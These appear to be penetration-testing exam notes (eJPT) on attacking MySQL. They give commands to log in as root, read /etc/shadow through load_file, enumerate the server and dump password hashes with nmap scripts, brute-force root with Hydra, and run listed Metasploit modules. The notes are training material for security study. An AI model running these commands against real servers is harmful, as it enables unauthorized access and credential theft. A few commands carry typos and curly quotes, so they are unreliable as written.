## MySQL - p3306

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

This command is used to connect to a remote database as a specific user.
```
mysql -h 10.10.10.1 -u root
```
```
show databases;
```
```
use database;
```
SQL can be used to access files that reside on the target machine.
```
mysql select load_file(“/etc/shadow”);
```

### Nmap

Check if root access with an empty password is enabled.
```
nmap 10.10.10.1 -sV -p3306 --script=mysql-empty-password
```
Check for service details.
```
nmap 10.10.10.1 -sV -p3306 —-cript=mysql-info
```
Check for all enabled users through the root user.
```
nmap 10.10.10.1 -sV -p3306 --script=mysql-users --script-args=“mysqlusers=‘root’, mysqlpass=‘’ ”
```
Check for all databases.
```
nmap 10.10.10.1 -sV -p3306 --script=mysql-databases --script-args=“mysqlusers=‘root’, mysqlpass=‘’ ”
```
Check for database configuration variables.
```
nmap 10.10.10.1 -sV -p3306 --script=mysql-variables --script-args=“mysqlusers=‘root’, mysqlpass=‘’ ”
```
A standard database benchmark to identify vulnerabilities.
```
nmap 10.10.10.1 -sV -p3306 --script=mysql-audit --script-args=“ mysql-audit.username=‘root’, mysqlpass=‘’, mysql-audit.password=‘’, mysql-audit.filename=‘/usr/share/nmap/nselib/data/mysql-cis.audit’ ”
```
Perform a dump of all usernames and passwords.
```
nmap 10.10.10.1 -sV -p3306 --script=mysql-dump-hashes --script-args=“username=‘root’, password=‘’ ”
```
Perform a SQL query.
```
nmap 10.10.10.1 -sV -p3306 --script=mysql-query --script-args=“query=‘select count(*) from books.authors;’, username=‘root’, password=‘’ ”
```

### Hydra
```
hydra -l root -P passwordfile.txt 10.10.10.1 mysql
```

### METASPLOIT
```
auxiliary/admin/mysql/mysql_enum
auxiliary/admin/mysql/mysql_sql
auxiliary/scanner/mysql/mysql_file_enum
auxiliary/scanner/mysql/mysql_hashdump
auxiliary/scanner/mysql/mysql_login
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_writable_dirs
```
